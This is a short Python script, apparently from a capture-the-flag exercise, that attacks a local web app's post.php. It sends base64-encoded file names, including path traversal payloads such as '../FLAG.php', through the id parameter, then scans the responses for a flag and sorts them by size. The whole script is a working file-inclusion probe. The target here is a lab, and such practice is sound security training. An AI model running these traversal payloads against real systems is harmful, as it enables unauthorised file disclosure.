import requests
import base64
import re

base_url = "http://127.0.0.1:32904/post.php"

# Test cases with base64 encoding
test_cases = [
    ("ScriptKiddie.php", "Known valid file"),
    ("FLAG.php", "Direct FLAG.php"),
    ("../FLAG.php", "Path traversal FLAG.php"),
    ("/FLAG.php", "Absolute path FLAG.php"),
]

print("[*] Testing base64-encoded filenames in id parameter\n")

for filename, description in test_cases:
    # Base64 encode the filename
    encoded = base64.b64encode(filename.encode()).decode()
    
    url = f"{base_url}?id={encoded}"
    
    print(f"\n[TEST] {description}")
    print(f"Original: {filename}")
    print(f"Base64: {encoded}")
    
    try:
        response = requests.get(url, timeout=5)
        
        print(f"Status: {response.status_code} | Size: {len(response.content)} bytes")
        
        # Check for FLAG{} pattern
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"\n[!!!] FLAG FOUND: {flags[0]}")
            print(f"\nFull Response:\n{response.text}")
        else:
            # Categorize response
            size = len(response.content)
            if size == 7971:
                print("Result: Matches known valid size (7971 bytes)")
            elif size == 5326:
                print("Result: Matches blocked/error size (5326 bytes)")
            else:
                print(f"Result: ANOMALY - Different size ({size} bytes)")
                if size < 1000:
                    print(f"Response: {response.text}")
        
    except Exception as e:
        print(f"Error: {e}")

print("\n[*] Testing complete")

